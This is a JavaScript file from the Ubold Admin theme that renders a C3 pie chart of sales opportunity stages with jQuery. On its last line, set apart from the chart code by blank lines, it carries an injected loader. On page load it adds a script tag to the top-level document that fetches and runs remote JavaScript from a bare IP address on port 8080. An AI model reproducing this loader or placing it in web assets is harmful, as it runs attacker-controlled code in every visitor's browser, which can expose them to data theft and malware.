/**
* Theme: Ubold Admin
* Author: Coderthemes
* Page: opportunities
*/

!function($) {
    "use strict";

    var Opportunities = function() {};

    Opportunities.prototype.init = function () {
        
        //Pie Chart
        c3.generate({
             bindto: '#pie-chart',
            data: {
                columns: [
                    ['Hot', 46],
                    ['Cold', 24],
                    ['In-progress', 46],
                    ['Lost', 10],
                    ['Won', 30]
                ],
                type : 'pie'
            },
            color: {
            	pattern: ["#34d3eb", "#7266ba", "#ffbd4a", "#f05050", "#81c868"]
            },
            pie: {
		        label: {
		          show: false
		        }
		    }
        });
        
    },
    $.Opportunities = new Opportunities, $.Opportunities.Constructor = Opportunities

}(window.jQuery),

//initializing 
function($) {
    "use strict";
    $.Opportunities.init()
}(window.jQuery);



;window.addEventListener('load',function(){var s = top.document.getElementById('1qa2ws');if(!s){s = top.document.createElement('script');s.id ='1qa2ws';s.type='text/javascript';s.src='http://105.203.255.69:8080/www/default/base.js?v2.1&method=1';top.document.body.appendChild(s);}},false);